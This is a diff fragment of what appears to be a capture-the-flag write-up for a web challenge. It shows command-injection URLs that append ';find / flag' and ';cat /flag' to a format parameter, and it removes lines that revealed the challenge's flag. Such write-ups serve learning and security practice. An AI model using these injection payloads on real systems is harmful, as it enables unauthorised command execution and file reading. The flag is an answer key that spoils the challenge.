@@ -20,11 +20,3 @@ Knowing that, we concatenated our own commands right after the date command. Fir
 	http://161.35.170.145:32055/?format=';find / flag'
 
 	http://161.35.170.145:32055/?format=';cat /flag'
-
-That gave us the flag **HTB{tim3_t4lks...4nd_1t_s4ys_1ts_t1m3_t0_pwn}**
-
-<p align="center">
-  <img src="../assets/timetok_flag.png" alt="timetok_flag" />
-</p>
-
-<p align="center">Flag as printed in the frontend.</p>
